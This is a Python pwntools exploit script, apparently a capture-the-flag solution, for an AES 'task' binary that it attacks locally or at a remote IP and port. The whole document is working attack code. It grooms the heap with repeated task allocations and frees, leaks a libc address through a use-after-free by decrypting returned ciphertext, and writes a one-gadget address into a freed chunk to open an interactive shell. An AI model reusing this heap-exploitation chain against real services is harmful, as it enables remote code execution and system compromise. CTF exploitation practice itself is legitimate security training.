#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
from Crypto.Cipher import AES
context.log_level="debug"
pwn_file = "./task"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.186.63.201",10001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def add_task(key,IV,EDchoice,task_id,data):
    r.sendlineafter("Choice: ", '1')
    r.sendlineafter("Task id : ", str(task_id))
    r.sendlineafter("Decrypt(2): ", str(EDchoice))
    r.sendafter("Key : ", key)
    r.sendafter("IV : ", IV)
    r.sendlineafter("Data Size : ", str(len(data)))
    r.sendafter("Data : ", data)

def delete_task(task_id):
    r.sendlineafter("Choice: ",'2')
    r.sendlineafter("Task id : ", str(task_id))

def do_task(task_id):
    r.sendlineafter("Choice: ",'3')
    r.sendlineafter("Task id : ", str(task_id))
key = 'a'*0x20
IV = 'a'*0x10
data = 'a'*60

for i in range(7):
    add_task(key,IV,1,i+10,"a"*0x200)

add_task(key,IV,1,100,"a"*0x200)

for i in range(7):
    delete_task(i+10)

add_task(key,IV,1,1,"a"*0x20)
add_task(key,IV,1,2,"a"*0x30)

delete_task(100)
add_task(key,IV,1,102,"a"*0x40)
do_task(2)
delete_task(2)

r.sendlineafter("Choice: ", '1')
r.sendlineafter("Task id : ", "3")
r.sendlineafter("Decrypt(2): ", "1")
r.sendafter("Key : ", key)
r.sendafter("IV : ", IV)
r.sendlineafter("Data Size : ", str(0x90))

r.recvuntil("Ciphertext: \n")
lines = r.recvlines(10)
data = "".join(lines).replace("\n","").replace(" ","").decode("hex")
aes = AES.new(key, AES.MODE_CBC, IV)
pt =  aes.decrypt(data)
libc.address = u64(pt[8:16])-0x3ebca0
r.send("a"*0x90)

add_task(key,IV,1,0xaaa,"a"*0x50)
for i in range(8):
    add_task(key,IV,1,0,"a"*0xb0)
f={
0x12:"\x10",
0x20:p64(libc.address + 0x10a38c)
        }
add_task(key,IV,1,0,fit(f,filler="\x00",length=0xa0))
delete_task(0)
debug()
do_task(0xaaa)
delete_task(0xaaa)
add_task(key,IV,1,0xaab,"a"*0xb0)
delete_task(0xaab)




r.interactive()








